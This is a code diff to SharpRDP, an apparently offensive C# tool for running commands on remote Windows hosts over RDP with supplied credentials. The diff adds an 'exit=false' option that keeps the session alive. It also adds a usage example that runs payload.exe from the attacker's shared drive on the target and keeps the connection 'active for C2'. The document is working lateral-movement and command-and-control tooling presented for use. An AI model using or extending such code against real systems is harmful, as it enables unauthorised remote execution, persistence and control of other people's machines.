@@ -28,6 +28,8 @@ namespace SharpRDP
             Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password elevated=winr");
             Console.WriteLine("  Execute command elevated through task manager");
             Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"C:\\Temp\\file.exe\" username=domain\\user password=password elevated=taskmgr");
+            Console.WriteLine("  Execute payload through shared drive and keep connection active for C2");
+            Console.WriteLine("    SharpRDP.exe computername=domain.target command=\"\\\\tsclient\\C\\payload.exe\" username=domain\\user password=password connectdrive=true exit=false");
         }
         static void Main(string[] args)
         {
@@ -60,6 +62,7 @@ namespace SharpRDP
             string execElevated = string.Empty;
             string execw = "";
             bool connectdrive = false;
+            bool exitend = true;
             bool takeover = false;
             bool nla = false;
             
@@ -129,6 +132,13 @@ namespace SharpRDP
                         connectdrive = true;
                     }
                 }
+                if (arguments.ContainsKey("exit"))
+                {
+                    if (arguments["exit"].ToLower() == "false")
+                    {
+                        exitend = false;
+                    }
+                }
                 if (arguments.ContainsKey("takeover"))
                 {
                     if (arguments["takeover"].ToLower() == "true")
@@ -146,7 +156,7 @@ namespace SharpRDP
                 string[] computerNames = arguments["computername"].Split(',');
                 foreach (string server in computerNames)
                 {
-                    rdpconn.CreateRdpConnection(server, username, domain, password, command, execw, execElevated, connectdrive, takeover, nla);
+                    rdpconn.CreateRdpConnection(server, username, domain, password, command, execw, execElevated, connectdrive, exitend, takeover, nla);
                 }
             }
             else
